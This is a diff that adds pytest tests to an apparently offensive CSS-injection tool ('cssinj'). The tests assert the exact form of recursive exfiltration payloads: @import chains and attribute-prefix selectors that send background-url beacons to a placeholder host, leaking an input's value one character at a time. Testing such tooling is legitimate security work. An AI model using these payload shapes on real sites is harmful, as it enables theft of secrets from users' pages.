@@ -3,11 +3,13 @@ import asyncio
 
 import pytest
 
+from cssinj.client import Client
 from cssinj.strategies import build_strategy, get_strategy, list_strategies
 from cssinj.strategies.complete import CompleteStrategy
 from cssinj.strategies.fontface import FontFaceStrategy
 from cssinj.strategies.recursive import RecursiveStrategy
 from cssinj.utils.default import ELEMENTS
+from cssinj.utils.dom import Attribute, Element
 
 from .conftest import ClientFactory
 
@@ -74,6 +76,86 @@ class TestRecursiveStrategy:
         assert c.elements[0].attributes[0].name == 'value'
         assert c.elements[0].attributes[0].value == 'secret'
         assert c.data == ''
+
+
+class TestRecursiveNextPayload:
+    """The recursive `/n` payload is the core of the attack — cover its shape."""
+
+    @staticmethod
+    def _client_with_history(make_client: ClientFactory) -> Client:
+        c = make_client()
+        c.id = 1
+        c.counter = 2
+        c.data = 'ab'
+        # A previously exfiltrated sibling whose value must be excluded next round.
+        el = Element(name='input')
+        el.attributes.append(Attribute(name='value', value='admin'))
+        c.elements.append(el)
+        return c
+
+    def test_next_payload_starts_with_import_of_n_route(self, make_client: ClientFactory) -> None:
+        c = self._client_with_history(make_client)
+        css = RecursiveStrategy(hostname='h', port=9).generate_next_payload(c)
+        assert css.startswith("@import url('//h:9/n?n=2&cid=1');")
+
+    def test_next_payload_completeness_selector_targets_e_route(self, make_client: ClientFactory) -> None:
+        c = self._client_with_history(make_client)
+        css = RecursiveStrategy(hostname='h', port=9, element='input', attribute='value').generate_next_payload(c)
+        # Full, well-formed completeness rule: matched value, excludes found siblings,
+        # depth = counter, fires the /e (end) beacon.
+        assert (
+            "html:has(input[value='ab']:not(input[value='admin'])):first-child:first-child"
+            '{background:url("//h:9/e?n=2&cid=1");}'
+        ) in css
+
+    def test_next_payload_extraction_probes_every_printable_char(self, make_client: ClientFactory) -> None:
+        c = self._client_with_history(make_client)
+        css = RecursiveStrategy(hostname='h', port=9).generate_next_payload(c)
+        # Prefix-match probe (`^=`) on the accumulated value plus the next char.
+        assert "input[value^='aba']" in css
+        assert '/v?t=aba&cid=1' in css
+
+    def test_next_payload_url_encodes_probe_values(self, make_client: ClientFactory) -> None:
+        c = self._client_with_history(make_client)
+        css = RecursiveStrategy(hostname='h', port=9).generate_next_payload(c)
+        # '&' would break the query string, so it must be percent-encoded.
+        assert '/v?t=ab%26&cid=1' in css
+
+    def test_next_payload_excludes_already_found_values(self, make_client: ClientFactory) -> None:
+        c = self._client_with_history(make_client)
+        css = RecursiveStrategy(hostname='h', port=9).generate_next_payload(c)
+        assert ":not(input[value='admin'])" in css
+
+    def test_next_payload_ignores_attributes_other_than_target(self, make_client: ClientFactory) -> None:
+        c = make_client()
+        c.id = 1
+        c.counter = 0
+        c.data = ''
+        el = Element(name='input')
+        el.attributes.append(Attribute(name='id', value='x'))  # not the exfiltrated attribute
+        c.elements.append(el)
+        css = RecursiveStrategy(hostname='h', port=9, element='input', attribute='value').generate_next_payload(c)
+        assert ":not(input[id='x'])" not in css
+        assert ":not(input[value='x'])" not in css
+
+    def test_next_payload_depth_matches_counter(self, make_client: ClientFactory) -> None:
+        c = make_client()
+        c.id = 1
+        c.counter = 3
+        c.data = ''
+        css = RecursiveStrategy(hostname='h', port=9).generate_next_payload(c)
+        assert ':first-child:first-child:first-child' in css
+        assert ':first-child:first-child:first-child:first-child' not in css
+
+    def test_next_payload_without_history_has_no_exclusions(self, make_client: ClientFactory) -> None:
+        c = make_client()
+        c.id = 4
+        c.counter = 0
+        c.data = ''
+        css = RecursiveStrategy(hostname='h', port=9).generate_next_payload(c)
+        assert ':not(' not in css
+        assert ':first-child' not in css
+        assert '/e?n=0&cid=4' in css
 
 
 # ---- FontFaceStrategy ----
